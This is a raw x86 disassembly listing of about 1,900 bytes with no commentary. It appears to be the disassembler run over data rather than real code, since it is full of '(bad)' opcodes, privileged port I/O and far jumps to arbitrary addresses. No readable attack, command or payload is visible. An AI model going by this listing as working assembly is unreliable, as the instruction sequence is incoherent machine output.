  41a490:	push   esi
  41a491:	cli    
  41a492:	mov    ah,0x65
  41a494:	out    0x4b,al
  41a496:	lods   eax,DWORD PTR ds:[esi]
  41a497:	jno    0x41a4fc
  41a499:	pop    ss
  41a49a:	(bad)  
  41a49c:	inc    esp
  41a49d:	test   BYTE PTR [ecx],dl
  41a49f:	xor    esp,DWORD PTR [ebp+0x1d]
  41a4a2:	inc    ebx
  41a4a3:	rcl    DWORD PTR [edx+ebp*4],0x95
  41a4a7:	(bad)  
  41a4a8:	cmc    
  41a4a9:	gs or  al,0xbc
  41a4ac:	or     DWORD PTR [edi+0xd7776e5],edi
  41a4b2:	jle    0x41a4bd
  41a4b4:	pushf  
  41a4b5:	add    BYTE PTR [esi-0x38909e35],0x4f
  41a4bc:	inc    eax
  41a4bd:	call   0x917d:0xa7d89f47
  41a4c4:	rep outs dx,BYTE PTR ds:[esi]
  41a4c6:	repnz cmp dl,bl
  41a4c9:	push   0xffffffc1
  41a4cb:	sbb    edi,edx
  41a4cd:	add    BYTE PTR [edx+0x59488c00],al
  41a4d3:	cmp    eax,0x51a4b159
  41a4d8:	mov    al,0xd7
  41a4da:	inc    ebx
  41a4db:	test   eax,0xc14dba65
  41a4e0:	inc    ecx
  41a4e1:	sub    ebp,DWORD PTR [ebx-0x78720463]
  41a4e7:	push   0x7c
  41a4e9:	or     BYTE PTR [eax+0x5c],0x49
  41a4ed:	ins    DWORD PTR es:[edi],dx
  41a4ee:	int    0x3d
  41a4f0:	(bad)  
  41a4f1:	idiv   BYTE PTR [eax+0x68]
  41a4f4:	push   ecx
  41a4f5:	repz icebp 
  41a4f7:	aad    0x8d
  41a4f9:	jmp    0xfc574ef8
  41a4fe:	in     eax,dx
  41a4ff:	sbb    eax,0x64b299bd
  41a504:	xchg   esi,eax
  41a505:	push   ebp
  41a506:	test   edx,0x1668e3fe
  41a50c:	in     eax,dx
  41a50d:	iret   
  41a50e:	push   esi
  41a50f:	and    ecx,esi
  41a511:	mov    BYTE PTR [edx+0x64541ec6],ah
  41a517:	mov    edx,0x53432e46
  41a51c:	lahf   
  41a51d:	fucom  st(6)
  41a51f:	xchg   edi,eax
  41a520:	inc    eax
  41a521:	leave  
  41a522:	xlat   BYTE PTR ds:[ebx]
  41a523:	push   0xffffffe6
  41a525:	mov    edx,DWORD PTR [esi+0x77]
  41a528:	push   0x58c05530
  41a52d:	fsub   DWORD PTR [ebx]
  41a52f:	pop    esi
  41a530:	repz sbb DWORD PTR [ecx],0xf1372557
  41a537:	es jae 0x41a5b7
  41a53a:	(bad)  
  41a53c:	sbb    BYTE PTR [ebx+0x5ebb625a],0x5f
  41a543:	(bad)  
  41a545:	jge    0x41a52b
  41a547:	aas    
  41a548:	nop
  41a549:	rcl    DWORD PTR [eax+0x46],1
  41a54c:	cmp    BYTE PTR [eax+ebp*8-0x64],dh
  41a550:	sub    al,0x33
  41a552:	fcomi  st,st(6)
  41a554:	(bad)  
  41a555:	and    al,0x34
  41a557:	mov    ebp,0x7be4aad7
  41a55c:	xchg   DWORD PTR [eax+0x5120e07],edi
  41a562:	fsub   DWORD PTR [ecx+0x2e15059f]
  41a568:	(bad)  
  41a569:	shl    BYTE PTR [edx+0x1b],0x21
  41a56d:	cmp    eax,0xaa487604
  41a572:	test   eax,0x55aa2637
  41a577:	cmc    
  41a578:	mov    al,0x43
  41a57a:	popa   
  41a57b:	ror    DWORD PTR [esi+0x14e84af3],cl
  41a581:	in     al,0xb1
  41a583:	push   ecx
  41a584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a585:	adc    esi,ecx
  41a587:	dec    ecx
  41a588:	retf   0x16df
  41a58b:	jne    0x41a527
  41a58d:	ins    BYTE PTR es:[edi],dx
  41a58e:	popa   
  41a58f:	sahf   
  41a590:	(bad)  
  41a591:	pop    ebp
  41a592:	int3   
  41a593:	scas   eax,DWORD PTR es:[edi]
  41a594:	adc    ebx,edi
  41a596:	sub    esp,DWORD PTR [ebx-0x451a9c6a]
  41a59c:	lds    ebp,FWORD PTR [edx-0x1d]
  41a59f:	xchg   ch,dl
  41a5a1:	xchg   edx,eax
  41a5a2:	push   esp
  41a5a3:	(bad)  
  41a5a4:	(bad)  
  41a5a6:	imul   esi,DWORD PTR [edx+0xf24058d],0x7a151b3b
  41a5b0:	in     eax,0xa1
  41a5b2:	and    ebx,DWORD PTR [eax]
  41a5b4:	mov    bl,0xa
  41a5b6:	ret    0x596a
  41a5b9:	sub    ax,0x660c
  41a5bd:	stos   DWORD PTR es:[edi],eax
  41a5be:	sbb    al,0xa6
  41a5c0:	jmp    0xa13b:0xb6afd831
  41a5c7:	or     edx,0xbd994331
  41a5cd:	jg     0x41a56d
  41a5cf:	popa   
  41a5d0:	mov    DWORD PTR [edx],ebx
  41a5d2:	sti    
  41a5d3:	and    bh,BYTE PTR [ecx+esi*4+0x2b]
  41a5d7:	dec    ecx
  41a5d8:	inc    esp
  41a5d9:	aas    
  41a5da:	mov    cl,0x9c
  41a5dc:	out    0xb0,eax
  41a5de:	call   DWORD PTR [edi-0x4616bd2f]
  41a5e4:	test   DWORD PTR [edx+edx*1],ebp
  41a5e7:	clc    
  41a5e8:	jo     0x41a573
  41a5ea:	cwde   
  41a5eb:	loop   0x41a5a1
  41a5ed:	sbb    BYTE PTR [edx],0x8a
  41a5f0:	sub    DWORD PTR [edi-0x70],esi
  41a5f3:	stc    
  41a5f4:	(bad)  
  41a5f6:	sub    bl,BYTE PTR [ebx-0x80]
  41a5f9:	mov    esi,0x7eb60778
  41a5fe:	sbb    dl,BYTE PTR [edi+0x7da74fe4]
  41a604:	adc    dh,0xb0
  41a607:	test   DWORD PTR [esp+ebp*1-0x2882f96b],edx
  41a60e:	iret   
  41a60f:	push   ebp
  41a610:	xchg   ecx,eax
  41a611:	or     dl,bl
  41a613:	and    cl,ch
  41a615:	ja     0x41a599
  41a617:	mov    ebx,0xb42eba99
  41a61c:	jmp    0x267a:0x8abb4bb8
  41a623:	fisttp QWORD PTR [eax]
  41a625:	inc    edx
  41a626:	sbb    al,0x9
  41a628:	cmc    
  41a629:	add    al,0xf4
  41a62b:	cwde   
  41a62c:	sti    
  41a62d:	rcr    BYTE PTR [ebx+eax*8+0x29],0xd6
  41a632:	rol    DWORD PTR [edi-0x73b6ee2],cl
  41a638:	jp     0x41a6a4
  41a63a:	sub    al,0xd9
  41a63c:	test   eax,0x850966c2
  41a641:	stc    
  41a642:	fwait
  41a643:	pop    edx
  41a644:	mov    ebx,0x437b3ee7
  41a649:	mov    ah,0x91
  41a64b:	popf   
  41a64c:	jnp    0x41a6ab
  41a64e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a64f:	dec    edx
  41a650:	xchg   edi,eax
  41a651:	aaa    
  41a652:	lds    edx,FWORD PTR [ebx]
  41a654:	and    eax,0x4797feb7
  41a659:	or     al,0x95
  41a65b:	add    bl,BYTE PTR [esi+ebp*1-0x7c7dbf0e]
  41a662:	mov    ch,0x99
  41a664:	add    eax,0x4d05418a
  41a669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a66a:	jmp    0x2dda:0xabd45c44
  41a671:	iret   
  41a672:	push   ss
  41a673:	mov    ch,0xfe
  41a675:	rcl    BYTE PTR [esi+0x69edcbba],0x32
  41a67c:	mov    bh,0xf4
  41a67e:	dec    edx
  41a67f:	sbb    BYTE PTR [esi+edi*8+0x2de454aa],bl
  41a686:	mov    edi,0x4ed75045
  41a68b:	mov    al,ds:0x74a01b36
  41a690:	(bad)  
  41a692:	sbb    bl,0x20
  41a695:	xchg   esi,eax
  41a696:	and    DWORD PTR [eax],ebp
  41a698:	loope  0x41a6ef
  41a69a:	xor    edx,DWORD PTR [edi+0x38]
  41a69d:	(bad)  
  41a69e:	call   0x6e21:0x45a6f13f
  41a6a5:	bound  ecx,QWORD PTR [ecx+0x54]
  41a6a8:	or     ebp,eax
  41a6aa:	call   0x30eb:0x657a5300
  41a6b1:	test   bh,ch
  41a6b3:	add    DWORD PTR [ecx],ecx
  41a6b5:	jnp    0x41a650
  41a6b7:	jae    0x41a696
  41a6b9:	jge    0x41a6eb
  41a6bb:	(bad)  [edx-0x3f]
  41a6be:	mov    ebp,0xa114386b
  41a6c3:	imul   ebp,DWORD PTR [ecx],0x3
  41a6c6:	xchg   ebx,eax
  41a6c7:	call   0x2f8686aa
  41a6cc:	or     eax,0x899a6ed6
  41a6d1:	popf   
  41a6d2:	out    0xa6,al
  41a6d4:	scas   eax,DWORD PTR es:[edi]
  41a6d5:	mov    cl,0xce
  41a6d7:	retf   
  41a6d8:	sar    DWORD PTR [ebp-0x30],1
  41a6db:	or     al,0xa9
  41a6dd:	fdiv   st(4),st
  41a6df:	inc    esi
  41a6e0:	dec    ebx
  41a6e1:	mov    esi,0xde4698fc
  41a6e6:	xchg   esi,eax
  41a6e7:	jg     0x41a701
  41a6e9:	inc    eax
  41a6ea:	sbb    eax,0x86be8133
  41a6ef:	jno    0x41a76e
  41a6f1:	sbb    BYTE PTR [eax+0x62],ch
  41a6f4:	add    DWORD PTR [esi],ebp
  41a6f6:	mov    ebx,0x971ced59
  41a6fb:	jg     0x41a6ba
  41a6fd:	adc    al,0x65
  41a6ff:	mov    ds,edi
  41a701:	xchg   esi,eax
  41a702:	test   BYTE PTR [eax],bl
  41a704:	push   ds
  41a705:	and    dh,BYTE PTR [ebp+ebx*4-0x6]
  41a709:	lahf   
  41a70a:	hlt    
  41a70b:	(bad)  
  41a70c:	push   ebx
  41a70d:	and    eax,0xf74fc45e
  41a712:	ins    DWORD PTR es:[edi],dx
  41a713:	pop    ss
  41a714:	push   cs
  41a715:	loop   0x41a730
  41a717:	inc    ebp
  41a718:	lahf   
  41a719:	dec    ebx
  41a71a:	cmp    DWORD PTR [eax-0x39],edx
  41a71d:	lea    ecx,[ecx]
  41a71f:	ins    DWORD PTR es:[edi],dx
  41a720:	mov    ch,0xf1
  41a722:	and    bh,BYTE PTR [ebx-0x1df99bec]
  41a728:	mov    bl,BYTE PTR [ebx+edi*1-0x43]
  41a72c:	sub    ah,BYTE PTR [ecx]
  41a72e:	jl     0x41a70f
  41a730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a731:	and    eax,0x7643a6f5
  41a736:	mov    edi,0x3acb5184
  41a73b:	in     eax,0x29
  41a73d:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41a73f:	mov    cl,0x92
  41a741:	mov    ah,0x43
  41a743:	dec    ebp
  41a744:	(bad)  
  41a745:	aad    0x60
  41a747:	xor    esi,DWORD PTR [esi+ecx*1-0xe8d4a84]
  41a74e:	icebp  
  41a74f:	add    ecx,ebp
  41a751:	scas   eax,DWORD PTR es:[edi]
  41a752:	mov    ds:0xfa01eb3a,eax
  41a757:	add    ebp,edx
  41a759:	pop    esi
  41a75a:	xor    ch,ah
  41a75c:	dec    esp
  41a75d:	sahf   
  41a75e:	int3   
  41a75f:	push   ecx
  41a760:	cmp    BYTE PTR [edi],0x6
  41a763:	push   0xffffff88
  41a765:	and    esi,DWORD PTR [eax+0x567fa2e1]
  41a76b:	mov    eax,0x7b3323f2
  41a770:	cmp    esp,esi
  41a772:	(bad)  
  41a773:	mov    BYTE PTR [esi+0x2786c73a],ah
  41a779:	sub    DWORD PTR [edx+0x79],ecx
  41a77c:	neg    dh
  41a77e:	pushf  
  41a77f:	adc    eax,0xfb8369ce
  41a784:	or     DWORD PTR [ebp-0x6ca2977d],ebp
  41a78a:	call   0x6c17:0x845fdbf5
  41a791:	cmc    
  41a792:	mov    bh,0xbe
  41a794:	out    dx,eax
  41a795:	jne    0x41a775
  41a797:	loop   0x41a7aa
  41a799:	jo     0x41a750
  41a79b:	jae    0x41a79f
  41a79d:	or     al,0x46
  41a79f:	or     edx,DWORD PTR [ebp-0x16921652]
  41a7a5:	push   edx
  41a7a6:	mov    edx,DWORD PTR [edi-0x2c]
  41a7a9:	retf   0x31a3
  41a7ac:	scas   eax,DWORD PTR es:[edi]
  41a7ad:	call   0x52520444
  41a7b2:	jae    0x41a7e5
  41a7b4:	cdq    
  41a7b5:	test   DWORD PTR [eax-0x1fb348b],0xafd4d91f
  41a7bf:	stos   DWORD PTR es:[edi],eax
  41a7c0:	(bad)  
  41a7c1:	sub    BYTE PTR [eax],bl
  41a7c3:	and    al,0x7d
  41a7c5:	test   DWORD PTR [esi],edx
  41a7c7:	inc    edi
  41a7c8:	push   DWORD PTR [ebp-0x3a]
  41a7cb:	mov    ah,BYTE PTR [edx+0x77889d93]
  41a7d1:	mov    ch,0xb8
  41a7d3:	xchg   ecx,eax
  41a7d4:	scas   al,BYTE PTR es:[edi]
  41a7d5:	xchg   ebx,eax
  41a7d6:	mov    ds:0x6bb0927d,eax
  41a7db:	push   esi
  41a7dc:	hlt    
  41a7dd:	dec    esp
  41a7de:	shr    DWORD PTR [edx],cl
  41a7e0:	pop    ss
  41a7e1:	sbb    BYTE PTR [esi+0x3cc855a7],ah
  41a7e7:	xor    DWORD PTR [eax+0x292876b1],ebx
  41a7ed:	cmp    dh,dh
  41a7ef:	or     al,BYTE PTR [esp+edi*2-0x4745f078]
  41a7f6:	fidivr DWORD PTR [esi]
  41a7f8:	add    ebx,DWORD PTR [ecx-0x27a756df]
  41a7fe:	add    eax,0xc4427876
  41a803:	adc    bh,BYTE PTR [di-0x29]
  41a807:	call   0xcc03e50d
  41a80c:	(bad)  
  41a80d:	lock jecxz 0x41a84b
  41a810:	and    ebp,edi
  41a812:	xchg   BYTE PTR [eax+0x262f46ca],cl
  41a818:	or     ax,sp
  41a81b:	and    al,BYTE PTR [ecx]
  41a81d:	jns    0x41a7cf
  41a81f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a820:	fdivr  DWORD PTR [esi]
  41a822:	outs   dx,DWORD PTR ds:[esi]
  41a823:	fsub   QWORD PTR [edi-0x1e]
  41a826:	in     eax,dx
  41a827:	inc    si
  41a829:	lds    ecx,FWORD PTR [edx]
  41a82b:	mov    BYTE PTR [ebx+0x7a1bab4d],cl
  41a831:	outs   dx,BYTE PTR ds:[esi]
  41a832:	mov    al,ds:0x349ba9f8
  41a837:	gs cmp al,0xac
  41a83a:	mov    ds,WORD PTR [edx]
  41a83c:	mov    BYTE PTR [ebx-0x6bc4e6ce],bl
  41a842:	ds js  0x41a804
  41a845:	inc    edx
  41a847:	jle    0x41a875
  41a849:	xor    al,0x52
  41a84b:	dec    edi
  41a84c:	adc    BYTE PTR [eax],ah
  41a84e:	mov    dh,0xa8
  41a850:	pop    ss
  41a851:	icebp  
  41a852:	imul   esi,DWORD PTR [ebx+eax*4-0x1714b192],0x5d667a1d
  41a85d:	mov    al,0x32
  41a85f:	push   ebx
  41a860:	jb     0x41a87c
  41a862:	push   ds
  41a863:	fidiv  DWORD PTR [ebp+0x3a]
  41a866:	cmp    al,0xe4
  41a868:	test   eax,0xa97df2
  41a86d:	pop    ss
  41a86e:	in     eax,0xdf
  41a870:	inc    ecx
  41a871:	shr    cl,0x48
  41a874:	icebp  
  41a875:	stos   BYTE PTR es:[edi],al
  41a876:	adc    edx,DWORD PTR [ebx+0x13eea97b]
  41a87c:	in     al,0x4c
  41a87e:	dec    esi
  41a87f:	xchg   esp,eax
  41a880:	lea    esp,[edi-0x442fd870]
  41a886:	fst    DWORD PTR [edi-0x4e]
  41a889:	imul   ebx,DWORD PTR [esi-0x4],0x6d86513f
  41a890:	imul   esp,DWORD PTR [edi+0x66293b6c],0xffffffdf
  41a897:	adc    bl,dl
  41a899:	xchg   esi,eax
  41a89a:	mov    al,ds:0xc8033640
  41a89f:	push   ebp
  41a8a0:	pop    ecx
  41a8a1:	ror    BYTE PTR [esi],cl
  41a8a3:	out    dx,eax
  41a8a4:	add    DWORD PTR [esi+0xa],edx
  41a8a7:	cs stc 
  41a8a9:	jmp    0x8ecc:0xf19ad326
  41a8b0:	nop
  41a8b1:	fsubr  DWORD PTR [eax]
  41a8b3:	mov    ecx,0xba0cc656
  41a8b8:	aam    0x24
  41a8ba:	or     DWORD PTR [ecx+0x33],ecx
  41a8bd:	ret    
  41a8be:	(bad)  
  41a8bf:	xor    eax,0x38ceba8c
  41a8c4:	sub    eax,0x1ff28761
  41a8c9:	aam    0xce
  41a8cb:	push   ecx
  41a8cc:	inc    eax
  41a8cd:	rol    BYTE PTR [edx+0x62],cl
  41a8d0:	or     edx,DWORD PTR [edx+eax*4-0x5e7a6d64]
  41a8d7:	ins    BYTE PTR es:[edi],dx
  41a8d8:	and    eax,0xb1ebf16c
  41a8dd:	out    dx,eax
  41a8de:	lea    esi,[ebx+eiz*4]
  41a8e1:	int3   
  41a8e2:	int3   
  41a8e3:	imul   eax,DWORD PTR [edx+0x47fe0b98],0x6af407e1
  41a8ed:	inc    ebp
  41a8ee:	dec    esp
  41a8ef:	xchg   edx,eax
  41a8f0:	inc    esi
  41a8f1:	xor    DWORD PTR [ecx+0x653abec],esi
  41a8f7:	in     al,0x54
  41a8f9:	shl    DWORD PTR [esp+edx*4+0x7190d1be],1
  41a900:	inc    ebp
  41a901:	lds    esi,FWORD PTR [ecx+0x3]
  41a904:	popf   
  41a905:	jmp    0x91d2faf9
  41a90a:	pop    eax
  41a90b:	push   ss
  41a90c:	dec    ecx
  41a90d:	mov    esi,0xac8322a9
  41a912:	sub    dh,BYTE PTR [ebp-0x36]
  41a915:	ins    BYTE PTR es:[edi],dx
  41a916:	inc    ebx
  41a917:	inc    ebx
  41a918:	xchg   edx,eax
  41a919:	push   0x52a714fe
  41a91e:	aaa    
  41a91f:	sub    BYTE PTR [edi-0x66],ah
  41a922:	cs jne 0x41a8dd
  41a925:	adc    ch,ch
  41a927:	in     eax,0x12
  41a929:	pop    ebp
  41a92a:	xlat   BYTE PTR ds:[ebx]
  41a92b:	outs   dx,BYTE PTR ds:[esi]
  41a92c:	jl     0x41a8fb
  41a92e:	and    bh,BYTE PTR [esi]
  41a930:	bound  eax,QWORD PTR [ebp+edx*2+0x5d676827]
  41a937:	gs inc esi
  41a939:	inc    ebp
  41a93a:	daa    
  41a93b:	cmp    BYTE PTR [ebx+edi*1],dl
  41a93e:	mov    BYTE PTR ds:0xbbedc081,al
  41a944:	fcom   st(7)
  41a946:	sub    DWORD PTR [eax+0x4ee5db26],ecx
  41a94c:	pop    edi
  41a94d:	xor    eax,0xffdbb79e
  41a952:	pushf  
  41a953:	pop    ss
  41a954:	sub    al,0x25
  41a956:	and    DWORD PTR [edx],ebp
  41a958:	dec    edi
  41a959:	pop    ecx
  41a95a:	mulps  xmm6,XMMWORD PTR [ecx+0x86de1e6]
  41a961:	push   eax
  41a962:	repz sbb edx,eax
  41a965:	pop    esp
  41a966:	add    eax,0x537ad627
  41a96b:	int    0x85
  41a96d:	push   eax
  41a96e:	cli    
  41a96f:	das    
  41a970:	push   ebx
  41a971:	adc    dl,ah
  41a973:	push   cx
  41a975:	sbb    al,0x9a
  41a977:	add    BYTE PTR [ebp+0xaa8aed0],0xf7
  41a97e:	add    esp,ebp
  41a980:	pushf  
  41a981:	repnz pop eax
  41a983:	rol    BYTE PTR ds:0x981b5b69,0x29
  41a98a:	test   al,0x9e
  41a98c:	add    al,0x1c
  41a98e:	out    dx,eax
  41a98f:	test   DWORD PTR [ecx],0x75e87ff
  41a995:	imul   esi,DWORD PTR [eax],0xffffffb2
  41a998:	lea    ecx,[edi]
  41a99a:	jmp    0x8ed0:0x1d54ff85
  41a9a1:	adc    DWORD PTR [ecx],0x60
  41a9a4:	dec    BYTE PTR [edi]
  41a9a6:	cmp    esi,ecx
  41a9a8:	loopne 0x41a98d
  41a9aa:	inc    esp
  41a9ab:	pop    eax
  41a9ac:	into   
  41a9ad:	jnp    0x41a959
  41a9af:	icebp  
  41a9b0:	iret   
  41a9b1:	push   ds
  41a9b2:	into   
  41a9b3:	push   edi
  41a9b4:	mov    dl,0xb1
  41a9b6:	out    0x4a,al
  41a9b8:	adc    eax,0x6267cf6d
  41a9bd:	idiv   DWORD PTR [ebx+0x414be522]
  41a9c3:	popf   
  41a9c4:	ds or  eax,0xa1bff445
  41a9ca:	stc    
  41a9cb:	int    0x37
  41a9cd:	out    dx,al
  41a9ce:	inc    ecx
  41a9cf:	ret    
  41a9d0:	jae    0x41aa0b
  41a9d2:	(bad)  
  41a9d3:	(bad)  
  41a9d4:	push   0x12a59a60
  41a9d9:	and    edi,DWORD PTR ds:0x62d0686f
  41a9df:	mov    bh,BYTE PTR [ebx-0x5055fa58]
  41a9e5:	nop
  41a9e6:	aam    0xcf
  41a9e8:	mov    bh,0x88
  41a9ea:	inc    edx
  41a9eb:	je     0x6d5ac969
  41a9f1:	fadd   QWORD PTR [esi+edi*8+0x78]
  41a9f5:	(bad)  
  41a9f7:	stc    
  41a9f8:	clc    
  41a9f9:	js     0x41a9ea
  41a9fb:	or     eax,0xcb0d17e7
  41aa00:	leave  
  41aa01:	arpl   WORD PTR [esi+edx*1+0x4b],bp
  41aa05:	or     BYTE PTR [esi+ebx*2-0x73],bl
  41aa09:	push   ds
  41aa0a:	es test al,0x81
  41aa0d:	imul   esp,esi,0xe776de0c
  41aa13:	repz cmp ebx,ecx
  41aa16:	mov    esp,DWORD PTR [edx-0x23]
  41aa19:	into   
  41aa1a:	and    edx,DWORD PTR [ebx+eiz*8]
  41aa1d:	dec    ecx
  41aa1e:	addr16 cwde 
  41aa20:	clc    
  41aa21:	pop    ds
  41aa22:	sbb    bh,BYTE PTR [esi-0x7d]
  41aa25:	jecxz  0x41aaa1
  41aa27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa28:	pop    edx
  41aa29:	or     esi,0xa9580ccd
  41aa2f:	loop   0x41aa3d
  41aa31:	push   ds
  41aa32:	push   eax
  41aa33:	into   
  41aa34:	xchg   esi,eax
  41aa35:	cwde   
  41aa36:	adc    esp,DWORD PTR [ecx+eax*8-0x12339dd4]
  41aa3d:	add    al,0x6a
  41aa3f:	xor    DWORD PTR [edx-0x381c2888],ebp
  41aa45:	mov    eax,ds:0x910f6cca
  41aa4a:	fs std 
  41aa4c:	cmp    esi,ebp
  41aa4e:	inc    ebx
  41aa4f:	inc    ecx
  41aa50:	ins    DWORD PTR es:[edi],dx
  41aa51:	or     eax,0x77695ee1
  41aa56:	test   eax,0xc5a6e61b
  41aa5b:	sbb    al,0x7d
  41aa5d:	jmp    0x5862:0x28cf8767
  41aa64:	adc    bl,BYTE PTR [edx-0x5326d077]
  41aa6a:	mov    al,0xce
  41aa6c:	cmc    
  41aa6d:	add    eax,0x17f102f3
  41aa72:	sahf   
  41aa73:	popa   
  41aa74:	jmp    0xe5fa:0x60dafb95
  41aa7b:	and    eax,0xc572f506
  41aa80:	repnz call FWORD PTR [eax+0x553145b4]
  41aa87:	ins    BYTE PTR es:[edi],dx
  41aa88:	bound  edi,QWORD PTR ss:0xc5328f3f
  41aa8f:	imul   edx,esp,0xffffffcf
  41aa92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa93:	pop    eax
  41aa94:	(bad)  
  41aa95:	mov    ds:0xa7ecb1d4,eax
  41aa9a:	push   cs
  41aa9b:	out    dx,eax
  41aa9c:	in     eax,0x5a
  41aa9e:	sti    
  41aa9f:	or     dh,ch
  41aaa1:	fcomp  DWORD PTR [ecx+ebp*1-0x66]
  41aaa5:	pop    esi
  41aaa6:	push   esi
  41aaa7:	in     eax,dx
  41aaa8:	fcom   DWORD PTR [esp+eax*8]
  41aaab:	mov    WORD PTR [edx+esi*4],cs
  41aaae:	sub    BYTE PTR [edi+edi*1+0x3695ee6b],cl
  41aab5:	pop    DWORD PTR [eax+edx*8]
  41aab8:	cmp    bh,cl
  41aaba:	and    eax,0x607ef4a1
  41aabf:	cmp    bl,ah
  41aac1:	push   eax
  41aac2:	retf   
  41aac3:	popa   
  41aac4:	inc    esp
  41aac5:	jge    0x41aa50
  41aac7:	jae    0x41aaee
  41aac9:	cs aad 0x82
  41aacc:	call   0xcf93:0x627d7a1f
  41aad3:	into   
  41aad4:	mov    al,ds:0xac57312d
  41aad9:	nop
  41aada:	dec    esi
  41aadb:	inc    ebp
  41aadc:	stos   DWORD PTR es:[edi],eax
  41aadd:	jmp    0x8a68065f
  41aae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aae3:	push   cs
  41aae4:	jb     0x41ab56
  41aae6:	sub    edx,0xb78a6a80
  41aaec:	jae    0x41aacc
  41aaee:	fcomi  st,st(3)
  41aaf0:	fwait
  41aaf1:	out    dx,al
  41aaf2:	imul   DWORD PTR [ecx+0x70de2f12]
  41aaf8:	mov    edx,DWORD PTR [edi+0x77e1cabf]
  41aafe:	sub    DWORD PTR [edi+0x22],esp
  41ab01:	stc    
  41ab02:	pop    es
  41ab03:	mov    ss,WORD PTR [edx-0x11]
  41ab06:	cwde   
  41ab07:	push   0x2e8bd606
  41ab0c:	pop    eax
  41ab0d:	or     DWORD PTR [edx],eax
  41ab0f:	data16 fild QWORD PTR [esi-0x4ab22a26]
  41ab16:	and    BYTE PTR [edx+0x5af4b9cd],dh
  41ab1c:	sbb    eax,0x51eccd95
  41ab21:	shl    BYTE PTR [edi],1
  41ab23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab24:	mov    dl,0x73
  41ab26:	and    bh,BYTE PTR [edx+ebx*8+0x53]
  41ab2a:	cli    
  41ab2b:	outs   dx,BYTE PTR ds:[esi]
  41ab2c:	retf   
  41ab2d:	int    0x61
  41ab2f:	call   0x6e76015d
  41ab34:	enter  0x1201,0xc7
  41ab38:	sar    BYTE PTR [eax],0xdc
  41ab3b:	loope  0x41aac1
  41ab3d:	shl    BYTE PTR [esi-0x22a1fb3c],0x72
  41ab44:	or     BYTE PTR [edx-0x6719d069],bl
  41ab4a:	sbb    al,0xc6
  41ab4c:	pop    ss
  41ab4d:	ret    0x426f
  41ab50:	jle    0x41ab15
  41ab52:	or     ecx,DWORD PTR [ecx+0x61]
  41ab55:	dec    ebp
  41ab56:	jge    0x41ab8d
  41ab58:	aaa    
  41ab59:	and    eax,0xbbc4f56d
  41ab5e:	mov    fs,WORD PTR ds:0x4d647d6b
  41ab64:	mov    ch,0xb2
  41ab66:	mov    edx,0x7ab60834
  41ab6b:	ret    0x7bf0
  41ab6e:	fucompp 
  41ab70:	xchg   DWORD PTR [edx-0x6a1d80f0],eax
  41ab76:	arpl   bx,dx
  41ab78:	pop    edx
  41ab79:	nop
  41ab7a:	mov    ds:0x2ec39f7b,al
  41ab7f:	dec    esp
  41ab80:	mov    ecx,edx
  41ab82:	jle    0x41abf6
  41ab84:	sub    BYTE PTR [edi-0x62f88a6d],dl
  41ab8a:	fs pop edi
  41ab8c:	pusha  
  41ab8d:	push   cs
  41ab8e:	popa   
  41ab8f:	jnp    0x41aba3
  41ab91:	and    DWORD PTR [ebx],esp
  41ab93:	xor    dh,BYTE PTR [esi]
  41ab95:	and    DWORD PTR [ecx],0x8dd977d0
  41ab9b:	pop    esp
  41ab9c:	inc    ebp
  41ab9d:	mov    eax,DWORD PTR [eax]
  41ab9f:	into   
  41aba0:	int3   
  41aba1:	xor    al,0xd7
  41aba3:	or     ah,ah
  41aba5:	mov    ah,0x44
  41aba7:	push   ebx
  41aba8:	mov    ch,BYTE PTR [bp+si+0x4d1a]
  41abad:	sbb    al,0x8a
  41abaf:	sub    edx,DWORD PTR [edx-0x6a42eb43]
  41abb5:	jg     0x41abcb
  41abb7:	cmp    al,0xa7
  41abb9:	xchg   DWORD PTR [edx+0x1900f44],esp
  41abbf:	dec    edx
  41abc0:	pop    ss
  41abc1:	sub    eax,0x5c146f09
  41abc6:	imul   esp,DWORD PTR [ebp-0x46],0x556ab620
  41abcd:	in     al,dx
  41abce:	or     BYTE PTR [ecx-0x23],bh
  41abd1:	and    BYTE PTR [ebx],al
  41abd3:	ss stos BYTE PTR es:[edi],al
  41abd5:	pusha  
  41abd6:	test   al,0x2b
  41abd8:	xlat   BYTE PTR ds:[ebx]
  41abd9:	aas    
  41abda:	add    dl,BYTE PTR [esi+0x41697f66]
  41abe0:	test   DWORD PTR [ebp+ecx*2+0x24],edx
  41abe4:	sub    BYTE PTR [ecx+0x26c12e44],dh
  41abea:	scas   eax,DWORD PTR es:[edi]
  41abeb:	scas   al,BYTE PTR es:[edi]
  41abec:	frstor [esi+0x2b]
  41abef:	sbb    al,0xc1
  41abf1:	mov    ch,0x1e
  41abf3:	add    al,0xda
  41abf5:	and    eax,DWORD PTR [edi-0x66]
  41abf8:	out    0x1c,eax
  41abfa:	in     eax,0x95
  41abfc:	fimul  DWORD PTR [ecx-0x4d]
  41abff:	dec    eax
  41ac00:	mov    eax,0x8a81c3ef
  41ac05:	jo     0x41ac43
  41ac07:	out    0x26,al
  41ac09:	sbb    BYTE PTR [ecx-0x36b6c658],al
  41ac0f:	retf   0x5dea
  41ac12:	lods   al,BYTE PTR ds:[esi]
  41ac13:	je     0x41abd1
  41ac15:	int3   
  41ac16:	add    bh,bl
  41ac18:	data16 or BYTE PTR [ecx+ebp*1+0x68],ah
  41ac1d:	dec    esi
  41ac1e:	aad    0x1f
  41ac20:	cmp    dh,bh
  41ac22:	(bad)  
  41ac23:	jmp    0xdf4fbe2d
  41ac28:	mov    BYTE PTR [esi+eiz*8],ch
  41ac2b:	sbb    dl,bh
  41ac2d:	jnp    0x41abd1
  41ac2f:	inc    edx
  41ac30:	xor    al,0xde
  41ac32:	pushf  
  41ac33:	aaa    
  41ac34:	push   DWORD PTR [edi]
  41ac36:	pop    ebx
  41ac37:	sub    ebx,DWORD PTR [ecx]
  41ac39:	jnp    0x41abe7
  41ac3b:	rcr    DWORD PTR [ecx-0x48],cl
  41ac3e:	mov    ebx,DWORD PTR [edi]
